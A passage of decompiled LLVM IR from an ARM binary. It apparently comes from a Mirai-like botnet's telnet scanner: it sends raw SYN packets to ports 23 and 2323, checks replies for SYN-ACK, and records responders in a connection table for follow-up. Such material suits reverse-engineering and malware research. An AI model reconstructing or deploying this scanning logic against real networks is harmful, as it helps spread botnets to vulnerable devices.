  store i16 %v4_f1f0, i16* bitcast (i32* @global_var_22422.200 to i16*), align 4
  br i1 %v9_f218, label %.thread56.thread, label %bb404

.thread56.thread:                                 ; preds = %dec_label_pc_f1b8
  store i32 4873, i32* %r3.global-to-local, align 4
  store i16 4873, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2242c.163 to i32), i32 2) to i16*), align 2
  %v4_f234288 = load i32, i32* @global_var_22428.201, align 4
  store i32 %v4_f234288, i32* @global_var_22430.203, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb405

bb404:                                            ; preds = %dec_label_pc_f1b8
  %v4_f234291 = load i32, i32* @global_var_22428.201, align 4
  store i32 ptrtoint (i32* @global_var_2242c.163 to i32), i32* %r1.global-to-local, align 4
  store i32 5888, i32* %r2.global-to-local, align 4
  store i32 %v4_f234291, i32* @global_var_22430.203, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i16 5888, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2242c.163 to i32), i32 2) to i16*), align 2
  br label %bb405

bb405:                                            ; preds = %.thread56.thread, %bb404
  store i16 0, i16* bitcast (i32* @global_var_2243c.204 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_2242c.163 to i32), i32* @r1, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v5_f260 = call i32 @checksum_tcpudp(i32 ptrtoint (i8** @global_var_22418.160 to i32), i32 ptrtoint (i32* @global_var_2242c.163 to i32), i32 5120, i32 20)
  %v6_f260 = trunc i32 %v5_f260 to i16
  store i32 ptrtoint (i8** @global_var_22418.160 to i32), i32* %r1.global-to-local, align 4
  %v2_f26c = load i32, i32* @global_var_24f30.158, align 4
  store i16 %v6_f260, i16* bitcast (i32* @global_var_2243c.204 to i16*), align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v3_f298 = load i16, i16* @global_var_2242e.168, align 2
  %v4_f298 = zext i16 %v3_f298 to i32
  store i32 %v4_f298, i32* @lr, align 4
  store i32 %v2_f86c, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v7_f2b4 = call i32 @__libc_sendto(i32 %v2_f26c, i32 ptrtoint (i8** @global_var_22418.160 to i32), i32 40, i32 16384, i32 %v2_10344, i32 16)
  %v3_f2b8 = load i32, i32* %stack_var_-52, align 4
  %v1_f2bc = add i32 %v3_f2b8, 1
  store i32 %v1_f2bc, i32* %r3.global-to-local, align 4
  %v3_f2c0 = icmp ugt i32 %v1_f2bc, 483
  store i1 %v3_f2c0, i1* %cpsr_c.global-to-local, align 1
  %v8_f2c0 = icmp eq i32 %v1_f2bc, 484
  store i1 %v8_f2c0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f2bc, i32* %stack_var_-52, align 4
  %v5_f2c8 = icmp slt i32 %v1_f2bc, 484
  br i1 %v5_f2c8, label %dec_label_pc_efe0, label %dec_label_pc_f2cc

dec_label_pc_f2cc:                                ; preds = %bb405
  %v0_f2cc = load i32, i32* @r4, align 4
  br label %dec_label_pc_f2d0

dec_label_pc_f2d0:                                ; preds = %dec_label_pc_efbc, %dec_label_pc_f2cc
  %stack_var_-1880.1 = phi i32 [ %stack_var_-1880.0, %dec_label_pc_efbc ], [ %v0_f2cc, %dec_label_pc_f2cc ]
  %v0_f2d0 = call i32 @__GI___errno_location()
  store i32 %v2_efb4, i32* %r1.global-to-local, align 4
  store i32 %v1_f2dc, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  %v2_f2ec = inttoptr i32 %v0_f2d0 to i32*
  br label %dec_label_pc_f2e4

dec_label_pc_f2e4:                                ; preds = %dec_label_pc_f3a8, %dec_label_pc_f3a0, %dec_label_pc_f398, %dec_label_pc_f374, %dec_label_pc_f364, %dec_label_pc_f34c, %dec_label_pc_f334, %dec_label_pc_f390, %dec_label_pc_f384, %dec_label_pc_f32c, %dec_label_pc_f468, %dec_label_pc_f2d0
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %v2_f2ec, align 4
  %v2_f2f8 = load i32, i32* @global_var_24f30.158, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v2_efb4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f308 = load i32, i32* %ip.global-to-local, align 4
  %v6_f310 = call i32 @__libc_recvfrom(i32 %v2_f2f8, i32 %v2_efb4, i32 1514, i32 16384, i32 %v0_f308, i32 %v0_f308)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f314 = icmp eq i32 %v6_f310, 0
  store i1 %v2_f314, i1* %cpsr_z.global-to-local, align 1
  %tmp406 = icmp slt i32 %v6_f310, 1
  br i1 %tmp406, label %dec_label_pc_f478, label %dec_label_pc_f31c

dec_label_pc_f31c:                                ; preds = %dec_label_pc_f2e4
  store i32 %v0_f2d0, i32* %ip.global-to-local, align 4
  %v2_f320 = load i32, i32* %v2_f2ec, align 4
  store i32 %v2_f320, i32* %r3.global-to-local, align 4
  %v2_f324 = icmp ugt i32 %v2_f320, 10
  store i1 %v2_f324, i1* %cpsr_c.global-to-local, align 1
  %v7_f324 = icmp eq i32 %v2_f320, 11
  store i1 %v7_f324, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f324, label %dec_label_pc_f478, label %dec_label_pc_f32c

dec_label_pc_f32c:                                ; preds = %dec_label_pc_f31c
  %v2_f32c = icmp ugt i32 %v6_f310, 38
  store i1 %v2_f32c, i1* %cpsr_c.global-to-local, align 1
  %v7_f32c = icmp eq i32 %v6_f310, 39
  store i1 %v7_f32c, i1* %cpsr_z.global-to-local, align 1
  %v2_f330 = xor i1 %v2_f32c, true
  %v3_f330 = or i1 %v7_f32c, %v2_f330
  br i1 %v3_f330, label %dec_label_pc_f2e4, label %dec_label_pc_f334

dec_label_pc_f334:                                ; preds = %dec_label_pc_f32c
  store i32 %v2_efb4, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_24f10.62 to i32), i32* %r1.global-to-local, align 4
  %v3_f33c = load i32, i32* %v2_f33c, align 4
  store i32 %v3_f33c, i32* %r2.global-to-local, align 4
  %v2_f340 = load i32, i32* @global_var_24f10.62, align 4
  store i32 %v2_f340, i32* %r3.global-to-local, align 4
  %v3_f344 = icmp uge i32 %v3_f33c, %v2_f340
  store i1 %v3_f344, i1* %cpsr_c.global-to-local, align 1
  %v9_f344 = icmp eq i32 %v3_f33c, %v2_f340
  store i1 %v9_f344, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f344, label %dec_label_pc_f34c, label %dec_label_pc_f2e4

dec_label_pc_f34c:                                ; preds = %dec_label_pc_f334
  %v3_f34c = load i8, i8* %v2_f34c, align 1
  %v4_f34c = zext i8 %v3_f34c to i32
  store i32 %v4_f34c, i32* %r3.global-to-local, align 4
  %v2_f350 = icmp ugt i8 %v3_f34c, 5
  store i1 %v2_f350, i1* %cpsr_c.global-to-local, align 1
  %v7_f350 = icmp eq i8 %v3_f34c, 6
  store i1 %v7_f350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f350, label %dec_label_pc_f358, label %dec_label_pc_f2e4

dec_label_pc_f358:                                ; preds = %dec_label_pc_f34c
  %v0_f358 = load i32, i32* @r4, align 4
  %v1_f358 = inttoptr i32 %v0_f358 to i16*
  %v2_f358 = load i16, i16* %v1_f358, align 2
  %v3_f358 = zext i16 %v2_f358 to i32
  store i32 %v3_f358, i32* %ip.global-to-local, align 4
  %v2_f35c = icmp ugt i16 %v2_f358, 5887
  store i1 %v2_f35c, i1* %cpsr_c.global-to-local, align 1
  %v7_f35c = icmp eq i16 %v2_f358, 5888
  store i1 %v7_f35c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f35c, label %dec_label_pc_f374, label %dec_label_pc_f364

dec_label_pc_f364:                                ; preds = %dec_label_pc_f358
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_f36c = icmp ugt i16 %v2_f358, 4872
  store i1 %v3_f36c, i1* %cpsr_c.global-to-local, align 1
  %v9_f36c = icmp eq i16 %v2_f358, 4873
  store i1 %v9_f36c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f36c, label %dec_label_pc_f374, label %dec_label_pc_f2e4

dec_label_pc_f374:                                ; preds = %dec_label_pc_f364, %dec_label_pc_f358
  %v1_f374 = add i32 %v0_f358, 2
  %v2_f374 = inttoptr i32 %v1_f374 to i16*
  %v3_f374 = load i16, i16* %v2_f374, align 2
  %v4_f374 = zext i16 %v3_f374 to i32
  store i32 %v4_f374, i32* %r3.global-to-local, align 4
  store i32 %v4_eea8, i32* %r2.global-to-local, align 4
  %v3_f37c = icmp uge i32 %v4_f374, %v4_eea8
  store i1 %v3_f37c, i1* %cpsr_c.global-to-local, align 1
  %v9_f37c = icmp eq i32 %v4_f374, %v4_eea8
  store i1 %v9_f37c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f37c, label %dec_label_pc_f384, label %dec_label_pc_f2e4

dec_label_pc_f384:                                ; preds = %dec_label_pc_f374
  %v1_f384 = add i32 %v0_f358, 13
  %v2_f384 = inttoptr i32 %v1_f384 to i8*
  %v3_f384 = load i8, i8* %v2_f384, align 1
  %v4_f384 = zext i8 %v3_f384 to i32
  store i32 %v4_f384, i32* %r3.global-to-local, align 4
  %v1_f388 = and i32 %v4_f384, 2
  %v2_f388 = icmp eq i32 %v1_f388, 0
  store i1 %v2_f388, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f388, label %dec_label_pc_f2e4, label %dec_label_pc_f390

dec_label_pc_f390:                                ; preds = %dec_label_pc_f384
  %v1_f390 = and i32 %v4_f384, 16
  %v2_f390 = icmp eq i32 %v1_f390, 0
  store i1 %v2_f390, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f390, label %dec_label_pc_f2e4, label %dec_label_pc_f398

dec_label_pc_f398:                                ; preds = %dec_label_pc_f390
  %v1_f398 = and i32 %v4_f384, 4
  %v2_f398 = icmp eq i32 %v1_f398, 0
  store i1 %v2_f398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f398, label %dec_label_pc_f3a0, label %dec_label_pc_f2e4

dec_label_pc_f3a0:                                ; preds = %dec_label_pc_f398
  %tmp = urem i8 %v3_f384, 2
  %v2_f3a0 = icmp eq i8 %tmp, 0
  store i1 %v2_f3a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f3a0, label %dec_label_pc_f3a8, label %dec_label_pc_f2e4

dec_label_pc_f3a8:                                ; preds = %dec_label_pc_f3a0
  %v1_f3a8 = add i32 %v0_f358, 8
  %v2_f3a8 = inttoptr i32 %v1_f3a8 to i32*
  %v3_f3a8 = load i32, i32* %v2_f3a8, align 4
  %v3_f3b0 = udiv i32 %v3_f3a8, 16777216
  %v1_f3b4 = and i32 %v3_f3a8, ptrtoint (i32* @global_var_ff00.34 to i32)
  %v1_f3ac = udiv i32 %v3_f3a8, 256
  %v4_f3b8 = and i32 %v1_f3ac, 65280
  %v4_f3bc = mul i32 %v1_f3b4, 256
  %v4_f3c0 = mul i32 %v3_f3a8, 16777216
  %v5_f3b8 = or i32 %v4_f3c0, %v3_f3b0
  %v5_f3bc = or i32 %v5_f3b8, %v4_f3b8
  %v5_f3c0 = or i32 %v5_f3bc, %v4_f3bc
  %v1_f3c4 = add i32 %v5_f3c0, -1
  store i32 %v1_f3c4, i32* %r2.global-to-local, align 4
  %v1_f3c8 = and i32 %v1_f3c4, 16711680
  %v3_f3cc = udiv i32 %v1_f3c4, 16777216
  %v4_f3d4 = udiv i32 %v1_f3c8, 256
  %v5_f3d4 = or i32 %v4_f3d4, %v3_f3cc
  %v1_f3d0 = mul i32 %v1_f3c4, 256
  %v4_f3d8 = and i32 %v1_f3d0, 16711680
  %v5_f3d8 = or i32 %v5_f3d4, %v4_f3d8
  store i32 %v5_f3d8, i32* %r3.global-to-local, align 4
  store i32 %v2_efb4, i32* %r1.global-to-local, align 4
  %v3_f3e0 = load i32, i32* %v2_f3e0, align 4
  store i32 %v3_f3e0, i32* @lr, align 4
  %v5_f3e4 = call i32 @llvm.bswap.i32(i32 %v1_f3c4)
  store i32 %v5_f3e4, i32* %r3.global-to-local, align 4
  %v3_f3e8 = icmp uge i32 %v5_f3e4, %v3_f3e0
  store i1 %v3_f3e8, i1* %cpsr_c.global-to-local, align 1
  %v9_f3e8 = icmp eq i32 %v5_f3e4, %v3_f3e0
  store i1 %v9_f3e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f3e8, label %dec_label_pc_f3f0, label %dec_label_pc_f2e4

dec_label_pc_f3f0:                                ; preds = %dec_label_pc_f3a8
  %v0_f3f0 = load i32, i32* @r5, align 4
  %v3_f3f0 = icmp ugt i32 %v0_f3f0, 355
  store i1 %v3_f3f0, i1* %cpsr_c.global-to-local, align 1
  %v8_f3f0 = icmp eq i32 %v0_f3f0, 356
  store i1 %v8_f3f0, i1* %cpsr_z.global-to-local, align 1
  %v6_f3f4 = icmp slt i32 %v0_f3f0, 356
  br i1 %v6_f3f4, label %dec_label_pc_f3f8, label %dec_label_pc_f478

dec_label_pc_f3f8:                                ; preds = %dec_label_pc_f3f0
  store i32 ptrtoint (i32* @global_var_24f2c.156 to i32), i32* %r2.global-to-local, align 4
  %v2_f404 = load i32, i32* @global_var_24f2c.156, align 4
  store i32 %v2_f404, i32* %r1.global-to-local, align 4
  %v3_f40c = mul i32 %v0_f3f0, 388
  store i32 %v3_f40c, i32* %r3.global-to-local, align 4
  %v2_f410 = add i32 %v2_f404, %v3_f40c
  store i32 %v2_f410, i32* @r0, align 4
  %v1_f414 = add i32 %v2_f410, 12
  %v2_f414 = inttoptr i32 %v1_f414 to i32*
  %v3_f414 = load i32, i32* %v2_f414, align 4
  store i32 %v3_f414, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f418 = icmp eq i32 %v3_f414, 0
  store i1 %v2_f418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f418, label %dec_label_pc_f460, label %dec_label_pc_f43c.preheader

dec_label_pc_f43c.preheader:                      ; preds = %dec_label_pc_f3f8
  %v2_f41c = add i32 %v0_f3f0, 1
  %v3_f428 = mul i32 %v2_f41c, 97
  %v2_f42c = and i32 %v3_f428, 1073741824
  %v3_f42c = icmp ne i32 %v2_f42c, 0
  store i1 %v3_f42c, i1* %cpsr_c.global-to-local, align 1
  %v4_f42c = mul i32 %v2_f41c, 388
  %v3_f430 = add i32 %v2_f404, %v4_f42c
  store i32 %v3_f430, i32* %r3.global-to-local, align 4
  store i32 %v0_f3f0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f43c

dec_label_pc_f43c:                                ; preds = %dec_label_pc_f43c.preheader, %dec_label_pc_f448
  %v0_f448 = phi i32 [ %v3_f430, %dec_label_pc_f43c.preheader ], [ %v1_f454, %dec_label_pc_f448 ]
  %v0_f43c = phi i32 [ %v0_f3f0, %dec_label_pc_f43c.preheader ], [ %v1_f43c, %dec_label_pc_f448 ]
  %v1_f43c = add i32 %v0_f43c, 1
  store i32 %v1_f43c, i32* %r2.global-to-local, align 4
  %v7_f440 = icmp eq i32 %v1_f43c, 356
  br i1 %v7_f440, label %dec_label_pc_f478.loopexit, label %dec_label_pc_f448

dec_label_pc_f448:                                ; preds = %dec_label_pc_f43c
  store i32 %v0_f448, i32* @r0, align 4
  %v1_f44c = add i32 %v0_f448, 12
  %v2_f44c = inttoptr i32 %v1_f44c to i32*
  %v3_f44c = load i32, i32* %v2_f44c, align 4
  %v2_f450 = icmp eq i32 %v3_f44c, 0
  %v1_f454 = add i32 %v0_f448, 388
  store i32 %v1_f454, i32* %r3.global-to-local, align 4
  br i1 %v2_f450, label %dec_label_pc_f45c, label %dec_label_pc_f43c

dec_label_pc_f45c:                                ; preds = %dec_label_pc_f448
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f43c, i32* @r5, align 4
  br label %dec_label_pc_f460

dec_label_pc_f460:                                ; preds = %dec_label_pc_f3f8, %dec_label_pc_f45c
  %v1_f468 = phi i32 [ %v2_f410, %dec_label_pc_f3f8 ], [ %v0_f448, %dec_label_pc_f45c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f460 = icmp eq i32 %v1_f468, 0
  store i1 %v2_f460, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f460, label %dec_label_pc_f478, label %dec_label_pc_f468

dec_label_pc_f468:                                ; preds = %dec_label_pc_f460
  %v2_f468 = add i32 %v1_f468, 16
  %v3_f468 = inttoptr i32 %v2_f468 to i32*
  store i32 %v3_f3e0, i32* %v3_f468, align 4
  %v0_f46c = load i32, i32* %ip.global-to-local, align 4
  %v1_f46c = trunc i32 %v0_f46c to i16
  %v2_f46c = load i32, i32* @r0, align 4
  %v3_f46c = add i32 %v2_f46c, 20
  %v4_f46c = inttoptr i32 %v3_f46c to i16*
  store i16 %v1_f46c, i16* %v4_f46c, align 2
  %v0_f470 = call i32 @setup_connection()
  br label %dec_label_pc_f2e4

dec_label_pc_f478.loopexit:                       ; preds = %dec_label_pc_f43c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f478

dec_label_pc_f478:                                ; preds = %dec_label_pc_f3f0, %dec_label_pc_f460, %dec_label_pc_f31c, %dec_label_pc_f2e4, %dec_label_pc_f478.loopexit
  store i32 0, i32* %stack_var_-224, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1676, i32* %ip.global-to-local, align 4
  %v2_f498512 = load i32, i32* @sp, align 4
  %v3_f498513 = add i32 %v2_f498512, 1676
  %v4_f498514 = inttoptr i32 %v3_f498513 to i32*
  store i32 0, i32* %v4_f498514, align 4
  br label %dec_label_pc_f484.dec_label_pc_f484_crit_edge

dec_label_pc_f484.dec_label_pc_f484_crit_edge:    ; preds = %dec_label_pc_f478, %dec_label_pc_f484.dec_label_pc_f484_crit_edge
  %v0_f484.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_f488 = add i32 %v0_f484.pre, 4
  store i32 %v1_f488, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f490 = add i32 %v0_f484.pre, 1672
  store i32 %v1_f490, i32* %ip.global-to-local, align 4
  %v7_f494 = icmp eq i32 %v1_f488, 128
  %v2_f498 = load i32, i32* @sp, align 4
  %v3_f498 = add i32 %v2_f498, %v1_f490
  %v4_f498 = inttoptr i32 %v3_f498 to i32*
  store i32 0, i32* %v4_f498, align 4
  br i1 %v7_f494, label %dec_label_pc_f4a0, label %dec_label_pc_f484.dec_label_pc_f484_crit_edge

dec_label_pc_f4a0:                                ; preds = %dec_label_pc_f484.dec_label_pc_f484_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_f4a0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_f4a0, i32* %stack_var_-352, align 4
  %v1_f4ac515 = add i32 %v0_f4a0, 8
  store i32 %v1_f4ac515, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_f4b4516 = add i32 %v0_f4a0, 1548
  store i32 %v1_f4b4516, i32* @lr, align 4
  %v7_f4b8517 = icmp eq i32 %v1_f4ac515, 128
  %v2_f4bc518 = load i32, i32* @sp, align 4
  %v3_f4bc519 = add i32 %v2_f4bc518, %v1_f4b4516
  %v4_f4bc520 = inttoptr i32 %v3_f4bc519 to i32*
  store i32 0, i32* %v4_f4bc520, align 4
  br i1 %v7_f4b8517, label %dec_label_pc_f4c4, label %dec_label_pc_f4a8.dec_label_pc_f4a8_crit_edge

dec_label_pc_f4a8.dec_label_pc_f4a8_crit_edge:    ; preds = %dec_label_pc_f4a0, %dec_label_pc_f4a8.dec_label_pc_f4a8_crit_edge
  %v0_f4a8.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_f4ac = add i32 %v0_f4a8.pre, 4
  store i32 %v1_f4ac, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_f4b4 = add i32 %v0_f4a8.pre, 1544
  store i32 %v1_f4b4, i32* @lr, align 4
  %v7_f4b8 = icmp eq i32 %v1_f4ac, 128
  %v2_f4bc = load i32, i32* @sp, align 4
  %v3_f4bc = add i32 %v2_f4bc, %v1_f4b4
  %v4_f4bc = inttoptr i32 %v3_f4bc to i32*
  store i32 0, i32* %v4_f4bc, align 4
  br i1 %v7_f4b8, label %dec_label_pc_f4c4, label %dec_label_pc_f4a8.dec_label_pc_f4a8_crit_edge

dec_label_pc_f4c4:                                ; preds = %dec_label_pc_f4a8.dec_label_pc_f4a8_crit_edge, %dec_label_pc_f4a0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_f4c4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_f4c4, i32* @r5, align 4
  store i32 %v0_f4c4, i32* @r6, align 4
  store i32 %v0_f4c4, i32* %stack_var_-52, align 4
  br label %dec_label_pc_f520

dec_label_pc_f4d4:                                ; preds = %dec_label_pc_f554
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f540, i1* %cpsr_z.global-to-local, align 1
  %v1_f5c4 = add i32 %v2_f538, 4
  %v2_f5c4 = inttoptr i32 %v1_f5c4 to i32*
  %v3_f5c4 = load i32, i32* %v2_f5c4, align 4
  br i1 %v7_f540, label %dec_label_pc_f5c4, label %dec_label_pc_f4dc

dec_label_pc_f4dc:                                ; preds = %dec_label_pc_f4d4
  store i32 %v3_f5c4, i32* %ip.global-to-local, align 4
  %v3_f4e0 = udiv i32 %v3_f5c4, 32
  store i32 %v2_f5d0, i32* %r1.global-to-local, align 4
  %v3_f4e8 = mul nuw nsw i32 %v3_f4e0, 4
  %v2_f4ec = add i32 %v3_f4e8, %v2_f5d0
  store i32 %v2_f4ec, i32* %r3.global-to-local, align 4
  %v1_f4f0 = add i32 %v2_f4ec, -184
  %v2_f4f0 = inttoptr i32 %v1_f4f0 to i32*
  %v3_f4f0 = load i32, i32* %v2_f4f0, align 4
  %v1_f4f4 = urem i32 %v3_f5c4, 32
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_f4fc = shl i32 1, %v1_f4f4
  %v8_f4fc = or i32 %v3_f4f0, %v7_f4fc
  store i32 %v8_f4fc, i32* %r2.global-to-local, align 4
  store i32 %v8_f4fc, i32* %v2_f4f0, align 4
  %v0_f504 = load i32, i32* @r6, align 4
  %v1_f504 = load i32, i32* %ip.global-to-local, align 4
  %v3_f504 = icmp uge i32 %v0_f504, %v1_f504
  store i1 %v3_f504, i1* %cpsr_c.global-to-local, align 1
  %v9_f504 = icmp eq i32 %v0_f504, %v1_f504
  store i1 %v9_f504, i1* %cpsr_z.global-to-local, align 1
  %v5_f508 = icmp slt i32 %v0_f504, %v1_f504
  br i1 %v5_f508, label %bb407, label %bb408

bb407:                                            ; preds = %dec_label_pc_f4dc
  store i32 %v1_f504, i32* @r6, align 4
  br label %bb408

bb408:                                            ; preds = %.thread76, %bb414, %bb412, %bb416, %dec_label_pc_f5b8, %dec_label_pc_f4dc, %bb407
  %v3_f50c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f50c, i32* %r3.global-to-local, align 4
  %v1_f510 = add i32 %v3_f50c, 1
  store i32 %v1_f510, i32* %r2.global-to-local, align 4
  %v3_f514 = icmp ugt i32 %v1_f510, 355
  store i1 %v3_f514, i1* %cpsr_c.global-to-local, align 1
  %v8_f514 = icmp eq i32 %v1_f510, 356
  store i1 %v8_f514, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f510, i32* %stack_var_-52, align 4
  %v6_f51c = icmp slt i32 %v1_f510, 356
  br i1 %v6_f51c, label %dec_label_pc_f520, label %dec_label_pc_f5f4

dec_label_pc_f520:                                ; preds = %bb408, %dec_label_pc_f4c4
  %v1_f52c = phi i32 [ %v1_f510, %bb408 ], [ %v0_f4c4, %dec_label_pc_f4c4 ]
  store i32 ptrtoint (i32* @global_var_24f2c.156 to i32), i32* @r1, align 4
  %v2_f530 = load i32, i32* @global_var_24f2c.156, align 4
  store i32 %v2_f530, i32* %r2.global-to-local, align 4
  %v3_f534 = mul i32 %v1_f52c, 388
  store i32 %v3_f534, i32* %r3.global-to-local, align 4
  %v2_f538 = add i32 %v2_f530, %v3_f534
  store i32 %v2_f538, i32* @r4, align 4
  %v1_f53c = add i32 %v2_f538, 12
  %v2_f53c = inttoptr i32 %v1_f53c to i32*
  %v3_f53c = load i32, i32* %v2_f53c, align 4
  store i32 %v3_f53c, i32* %ip.global-to-local, align 4
  %v2_f540 = icmp ne i32 %v3_f53c, 0
  store i1 %v2_f540, i1* %cpsr_c.global-to-local, align 1
  %v7_f540 = icmp eq i32 %v3_f53c, 1
  store i1 %v7_f540, i1* %cpsr_z.global-to-local, align 1
  %v2_f544 = xor i1 %v2_f540, true
  %v3_f544 = or i1 %v7_f540, %v2_f544
  br i1 %v3_f544, label %bb409, label %bb410

bb409:                                            ; preds = %dec_label_pc_f520
  store i32 5, i32* @r1, align 4
  br label %bb410

bb410:                                            ; preds = %dec_label_pc_f520, %bb409
  %v1_f564215 = phi i32 [ ptrtoint (i32* @global_var_24f2c.156 to i32), %dec_label_pc_f520 ], [ 5, %bb409 ]
  %v2_f548 = xor i1 %v7_f540, true
  %v3_f548 = and i1 %v2_f540, %v2_f548
  br i1 %v3_f548, label %bb411, label %bb412

bb411:                                            ; preds = %bb410
  store i32 30, i32* @r1, align 4
  br label %bb412

bb412:                                            ; preds = %bb410, %bb411
  %v1_f564 = phi i32 [ %v1_f564215, %bb410 ], [ 30, %bb411 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f54c = icmp eq i32 %v3_f53c, 0
  store i1 %v2_f54c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f54c, label %bb408, label %dec_label_pc_f554

dec_label_pc_f554:                                ; preds = %bb412
  store i32 ptrtoint (i32* @global_var_22448.145 to i32), i32* %r2.global-to-local, align 4
  %v2_f558 = load i32, i32* @global_var_22448.145, align 4
  store i32 %v2_f558, i32* %r3.global-to-local, align 4
  %v1_f55c = add i32 %v2_f538, 8
  %v2_f55c = inttoptr i32 %v1_f55c to i32*
  %v3_f55c = load i32, i32* %v2_f55c, align 4
  store i32 %v3_f55c, i32* %r2.global-to-local, align 4
  %v2_f560 = sub i32 %v2_f558, %v3_f55c
  store i32 %v2_f560, i32* %r3.global-to-local, align 4
  %v3_f564 = icmp uge i32 %v2_f560, %v1_f564
  store i1 %v3_f564, i1* %cpsr_c.global-to-local, align 1
  %v9_f564 = icmp eq i32 %v2_f560, %v1_f564
  store i1 %v9_f564, i1* %cpsr_z.global-to-local, align 1
  %v2_f568 = xor i1 %v3_f564, true
  %v3_f568 = or i1 %v9_f564, %v2_f568
  br i1 %v3_f568, label %dec_label_pc_f4d4, label %dec_label_pc_f56c

dec_label_pc_f56c:                                ; preds = %dec_label_pc_f554
  %v1_f56c = add i32 %v2_f538, 4
  %v2_f56c = inttoptr i32 %v1_f56c to i32*
  %v3_f56c = load i32, i32* %v2_f56c, align 4
  %v1_f570 = call i32 @__GI___libc_close(i32 %v3_f56c)
  %v0_f574 = load i32, i32* @r4, align 4
  %v1_f574 = add i32 %v0_f574, 12
  %v2_f574 = inttoptr i32 %v1_f574 to i32*
  %v3_f574 = load i32, i32* %v2_f574, align 4
  store i32 %v3_f574, i32* %r3.global-to-local, align 4
  %v2_f578 = icmp ugt i32 %v3_f574, 1
  store i1 %v2_f578, i1* %cpsr_c.global-to-local, align 1
  %v7_f578 = icmp eq i32 %v3_f574, 2
  store i1 %v7_f578, i1* %cpsr_z.global-to-local, align 1
  %v2_f57c = xor i1 %v2_f578, true
  %v3_f57c = or i1 %v7_f578, %v2_f57c
  br i1 %v3_f57c, label %bb413, label %.thread300

.thread300:                                       ; preds = %dec_label_pc_f56c
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_f584297301 = add i32 %v0_f574, 4
  %v3_f584298302 = inttoptr i32 %v2_f584297301 to i32*
  store i32 -1, i32* %v3_f584298302, align 4
  br label %bb414

bb413:                                            ; preds = %dec_label_pc_f56c
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_f584294 = add i32 %v0_f574, 4
  %v3_f584295 = inttoptr i32 %v2_f584294 to i32*
  store i32 -1, i32* %v3_f584295, align 4
  %v4_f588 = load i32, i32* %r3.global-to-local, align 4
  %v5_f588 = load i32, i32* @r4, align 4
  %v6_f588 = add i32 %v5_f588, 12
  %v7_f588 = inttoptr i32 %v6_f588 to i32*
  store i32 %v4_f588, i32* %v7_f588, align 4
  %v4_f58c = load i32, i32* %r3.global-to-local, align 4
  %v5_f58c = trunc i32 %v4_f58c to i8
  %v6_f58c = load i32, i32* @r4, align 4
  %v7_f58c = add i32 %v6_f58c, 384
  %v8_f58c = inttoptr i32 %v7_f58c to i8*
  store i8 %v5_f58c, i8* %v8_f58c, align 1
  %v0_f590.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f590.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb414

bb414:                                            ; preds = %.thread300, %bb413
  %v1_f590 = phi i1 [ %v1_f590.pre, %bb413 ], [ %v2_f578, %.thread300 ]
